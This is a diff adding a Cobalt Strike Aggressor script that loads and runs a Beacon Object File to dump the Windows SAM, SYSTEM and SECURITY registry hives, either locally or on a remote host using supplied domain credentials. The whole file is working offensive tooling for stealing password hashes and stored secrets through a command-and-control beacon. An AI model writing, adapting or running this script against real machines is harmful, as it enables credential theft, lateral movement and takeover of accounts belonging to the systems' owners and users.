@@ -1,0 +1,40 @@
+# BackupPrivilege BOF - Aggressor Script
+# Dumps SAM, SYSTEM, SECURITY hives via registry API
+#
+# Two modes:
+#   LOCAL:  backupprivilege C:\savefolder
+#   REMOTE: backupprivilege \\target C:\savefolder DOMAIN username password
+
+alias backupprivilege {
+    local('$bid $barch $handle $data $args');
+    $bid = $1;
+
+    if (size(@_) < 2) {
+        berror($bid, "Usage:");
+        berror($bid, "  LOCAL:  backupprivilege C:\\savefolder");
+        berror($bid, "  REMOTE: backupprivilege \\\\target C:\\savefolder DOMAIN user password");
+        return;
+    }
+
+    # Determine architecture
+    $barch  = barch($bid);
+
+    # Read the BOF file
+    $handle = openf(script_resource("backupprivilege_bof.o"));
+    $data   = readb($handle, -1);
+    closef($handle);
+
+    # Always pack 5 wide string args (empty strings for unused ones)
+    # Z = wide string (wchar_t*)
+    $a1 = iff(size(@_) >= 2, $2, "");
+    $a2 = iff(size(@_) >= 3, $3, "");
+    $a3 = iff(size(@_) >= 4, $4, "");
+    $a4 = iff(size(@_) >= 5, $5, "");
+    $a5 = iff(size(@_) >= 6, $6, "");
+
+    $args = bof_pack($bid, "ZZZZZ", $a1, $a2, $a3, $a4, $a5);
+
+    # Execute the BOF
+    btask($bid, "Running BackupPrivilege BOF by @lineeralgebra");
+    beacon_inline_execute($bid, $data, "go", $args);
+}
